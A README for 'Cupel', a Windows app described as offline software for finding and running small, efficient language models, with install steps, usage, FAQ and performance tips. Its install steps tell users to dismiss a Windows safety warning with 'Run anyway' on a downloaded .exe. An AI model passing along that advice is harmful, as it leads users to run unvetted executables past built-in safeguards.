## 📌 About This Tool

Cupel helps users find language models that provide excellent results despite their small size. Many models occupy significant disk space and demand expensive hardware. This tool evaluates smaller, efficient alternatives. You test different models on your own machine without relying on external servers or cloud subscriptions. Your data remains on your computer at all times.

## 📥 Getting Started

You do not need to understand programming or command lines to use this tool. Follow these steps to set up the software on your Windows computer.

1. Visit the [releases page](https://github.com/scfeads/cupel/releases) to download the latest version.
2. Look for the file ending in `.exe` under the Assets section.
3. Save this file to your Downloads folder or any folder you prefer. 
4. Double-click the file to start the installation.
5. Windows might show a safety message because the app is new. Click More Info and then select Run anyway to start the setup.
6. Follow the on-screen prompts to complete the installation process.

## 💻 System Requirements

Your computer requires specific hardware to run these models smoothly. Ensure your system meets these standards:

* Operating System: Windows 10 or Windows 11.
* Memory: At least 8 gigabytes of RAM.
* Storage: 2 gigabytes of free disk space for the tool, plus extra space for the models you download.
* Graphics: A dedicated graphics card helps performance but is not mandatory.

## 🛠️ How to Use

Once you open the software, the main screen shows a list of available models. You can filter these options based on their performance scores and file sizes.

1. Search for a task or a topic in the search bar. 
2. The tool displays a list of recommended models.
3. Click the Download button next to the model name. The size of the file appears before you start the download.
4. Wait for the download to finish. 
5. Select the model from your library by clicking its name.
6. Type your prompt into the box at the bottom of the screen.
7. Click the Send button to receive a response.

## ⚙️ Managing Models

The settings menu allows you to manage where the app stores your files. If your drive runs out of space, change the folder location in the Configuration tab. You can also remove models you no longer use to free up disk space. Highlight the model in the library and select Delete.

## 📝 Frequently Asked Questions

**Does this tool use my internet connection?**
It only uses your internet connection to download the model files. Once a model resides on your computer, you can disconnect your internet and continue using the software.

**Is my private data safe?**
Yes. The software functions entirely offline. No text you enter, and no documents you upload, leave your machine.

**Why does the system feel slow?**
Some models demand more memory than others. If the response time feels slow, try a smaller model from the list.

**How do I update the tool?**
When a new version appears, visit the [releases page](https://github.com/scfeads/cupel/releases) again. Download the latest installer and run it. The installer replaces the old files while keeping your model library intact.

## ⚖️ Performance Tips

Language model performance relies on your hardware. If your computer stays cool and fast, you can try larger models with higher parameters. If you notice your laptop fans spinning fast, stick to models labeled as efficient or small to maintain speed. Monitor your RAM usage in the Task Manager if the app becomes unresponsive. Clearing your cache from the Settings menu also improves general performance after multiple sessions.

## 📈 Understanding Evaluations

The evaluation metric within Cupel measures how well a model follows instructions compared to its size. We use standard benchmarks to score each model. A higher score signifies better accuracy. Use these scores to decide which model fits your unique hardware limitations. We update these scores regularly as we test new model versions.
